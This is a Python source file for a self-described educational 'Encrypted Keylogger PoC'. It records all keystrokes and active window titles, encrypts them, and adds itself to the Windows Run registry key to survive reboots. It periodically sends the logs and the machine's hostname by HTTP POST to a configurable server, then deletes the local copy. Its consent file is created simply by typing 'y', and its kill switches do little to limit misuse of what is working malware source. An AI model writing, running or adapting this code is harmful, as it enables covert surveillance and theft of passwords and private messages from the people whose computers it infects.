import os
import sys
import time
import json
import threading
import requests
from datetime import datetime
from pynput import keyboard
from pynput.keyboard import Key, Listener
import schedule

from config import CONFIG, get_cipher
from utils import (
    get_timestamp, encode_data, check_ethical_constraints,
    check_kill_switch, cleanup_old_logs, get_active_window_title,
    is_sensitive_application, log_warning, check_runtime_limit,
    safe_exit
)

class EncryptedKeylogger:
    """Encrypted Keylogger with Data Exfiltration"""
    
    def __init__(self):
        self.cipher = get_cipher()
        self.log_buffer = []
        self.start_time = time.time()
        self.running = True
        self.kill_switch_combo = {Key.ctrl_l, Key.shift, keyboard.KeyCode.from_char('q')}
        self.current_keys = set()
        
        # Initialize
        self.setup_persistence()
        self.schedule_exfiltration()
        
    def setup_persistence(self):
        """Setup startup persistence (Windows Registry)"""
        try:
            import winreg
            key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
            
            # Open registry key
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            
            # Set value for persistence
            script_path = os.path.abspath(__file__)
            winreg.SetValueEx(key, CONFIG['PERSISTENCE_NAME'], 0, winreg.REG_SZ, 
                            f'python "{script_path}"')
            winreg.CloseKey(key)
            
            log_warning("Persistence mechanism activated")
            
        except Exception as e:
            log_warning(f"Failed to setup persistence: {e}")
    
    def remove_persistence(self):
        """Remove startup persistence"""
        try:
            import winreg
            key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, CONFIG['PERSISTENCE_NAME'])
            winreg.CloseKey(key)
            log_warning("Persistence mechanism removed")
        except Exception as e:
            log_warning(f"Failed to remove persistence: {e}")
    
    def encrypt_and_store(self, data):
        """Encrypt data and store locally"""
        try:
            # Create log entry
            log_entry = {
                'timestamp': get_timestamp(),
                'data': data,
                'window': get_active_window_title(),
                'session_id': str(int(self.start_time))
            }
            
            # Encrypt the log entry
            encrypted_data = self.cipher.encrypt(json.dumps(log_entry).encode())
            
            # Store in buffer
            self.log_buffer.append(encrypted_data)
            
            # Write to file
            with open(CONFIG['LOG_FILE'], 'ab') as f:
                f.write(encrypted_data + b'\n')
                
        except Exception as e:
            log_warning(f"Error encrypting/storing data: {e}")
    
    def on_key_press(self, key):
        """Handle key press events"""
        try:
            # Add key to current keys set
            self.current_keys.add(key)
            
            # Check for kill switch combination
            if self.kill_switch_combo.issubset(self.current_keys):
                safe_exit("Kill switch activated via keyboard shortcut")
            
            # Skip if sensitive application
            if is_sensitive_application():
                return
            
            # Process the key
            if hasattr(key, 'char') and key.char is not None:
                # Regular character
                self.encrypt_and_store(key.char)
            else:
                # Special key
                special_keys = {
                    Key.space: ' ',
                    Key.enter: '[ENTER]',
                    Key.tab: '[TAB]',
                    Key.backspace: '[BACKSPACE]',
                    Key.delete: '[DELETE]',
                    Key.shift: '[SHIFT]',
                    Key.ctrl: '[CTRL]',
                    Key.alt: '[ALT]',
                    Key.esc: '[ESC]',
                    Key.up: '[UP]',
                    Key.down: '[DOWN]',
                    Key.left: '[LEFT]',
                    Key.right: '[RIGHT]'
                }
                
                if key in special_keys:
                    self.encrypt_and_store(special_keys[key])
                else:
                    self.encrypt_and_store(f'[{str(key)}]')
                    
        except Exception as e:
            log_warning(f"Error processing key press: {e}")
    
    def on_key_release(self, key):
        """Handle key release events"""
        try:
            # Remove key from current keys set
            self.current_keys.discard(key)
        except Exception:
            pass
    
    def exfiltrate_data(self):
        """Simulate data exfiltration to remote server"""
        try:
            if not self.log_buffer:
                return
            
            # Prepare data for exfiltration
            encrypted_logs = []
            for encrypted_entry in self.log_buffer:
                encrypted_logs.append(encode_data(encrypted_entry.decode('latin-1')))
            
            # Metadata
            metadata = {
                'timestamp': get_timestamp(),
                'session_id': str(int(self.start_time)),
                'log_count': len(encrypted_logs),
                'system_info': {
                    'platform': sys.platform,
                    'hostname': os.environ.get('COMPUTERNAME', 'unknown')
                }
            }
            
            # Prepare payload
            payload = {
                'encrypted_logs': encrypted_logs,
                'metadata': metadata
            }
            
            # Send to mock server
            response = requests.post(
                CONFIG['SERVER_URL'],
                json=payload,
                timeout=10,
                headers={'Content-Type': 'application/json'}
            )
            
            if response.status_code == 200:
                print(f"✅ Exfiltrated {len(encrypted_logs)} log entries")
                
                # Clear buffer after successful exfiltration
                self.log_buffer.clear()
                
                # Clean up local file
                if os.path.exists(CONFIG['LOG_FILE']):
                    os.remove(CONFIG['LOG_FILE'])
                    
            else:
                log_warning(f"Exfiltration failed: HTTP {response.status_code}")
                
        except requests.exceptions.ConnectionError:
            log_warning("Exfiltration server not available")
        except Exception as e:
            log_warning(f"Exfiltration error: {e}")
    
    def schedule_exfiltration(self):
        """Schedule periodic data exfiltration"""
        schedule.every(CONFIG['EXFILTRATION_INTERVAL']).seconds.do(self.exfiltrate_data)
    
    def monitor_system(self):
        """Monitor system for kill switches and constraints"""
        while self.running:
            try:
                # Check kill switch file
                if check_kill_switch():
                    safe_exit("Kill switch file detected")
                
                # Check runtime limit
                if check_runtime_limit(self.start_time):
                    safe_exit("Runtime limit exceeded")
                
                # Run scheduled tasks
                schedule.run_pending()
                
                # Sleep for a bit
                time.sleep(1)
                
            except Exception as e:
                log_warning(f"System monitor error: {e}")
                time.sleep(5)
    
    def start(self):
        """Start the keylogger"""
        try:
            print("🔐 Encrypted Keylogger Starting...")
            print("⚠️  Educational/Research Purpose Only!")
            print(f"📅 Session started: {get_timestamp()}")
            print("🔑 Kill switch: Ctrl+Shift+Q or create KILL_SWITCH.txt")
            print("=" * 50)
            
            # Start system monitor in background
            monitor_thread = threading.Thread(target=self.monitor_system, daemon=True)
            monitor_thread.start()
            
            # Start keyboard listener
            with Listener(
                on_press=self.on_key_press,
                on_release=self.on_key_release
            ) as listener:
                listener.join()
                
        except Exception as e:
            log_warning(f"Keylogger error: {e}")
            safe_exit("Keylogger terminated due to error")
    
    def stop(self):
        """Stop the keylogger"""
        self.running = False
        self.remove_persistence()
        
        # Final exfiltration
        if self.log_buffer:
            self.exfiltrate_data()
        
        print("🛑 Keylogger stopped")

def create_consent_file():
    """Create consent file for ethical compliance"""
    consent_content = f"""CONSENT FOR KEYLOGGER OPERATION

I, the user of this system, hereby provide my explicit consent for the operation 
of this educational keylogger on this device.

Purpose: Educational and security research only
Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
System: {os.environ.get('COMPUTERNAME', 'unknown')}

I understand that:
1. This keylogger is for educational purposes only
2. I am responsible for ensuring legal compliance
3. This tool should not be used on systems I do not own
4. All data will be encrypted and handled securely

Consent granted: YES
"""
    
    with open('consent.txt', 'w') as f:
        f.write(consent_content)
    
    print("✅ Consent file created: consent.txt")

def main():
    """Main function"""
    print("🔐 Encrypted Keylogger PoC")
    print("=" * 30)
    
    # Check ethical constraints
    if not check_ethical_constraints():
        print("\n❌ Ethical constraints not met!")
        
        response = input("Create consent file? (y/n): ").lower()
        if response == 'y':
            create_consent_file()
            print("✅ Consent file created. Please restart the program.")
        else:
            print("❌ Cannot proceed without consent")
        return
    
    # Clean up old logs
    cleanup_old_logs()
    
    # Initialize and start keylogger
    keylogger = EncryptedKeylogger()
    
    try:
        keylogger.start()
    except KeyboardInterrupt:
        keylogger.stop()
        safe_exit("Keylogger terminated by user")
    except Exception as e:
        log_warning(f"Fatal error: {e}")
        keylogger.stop()
        safe_exit("Keylogger terminated due to fatal error")

if __name__ == "__main__":
    main()
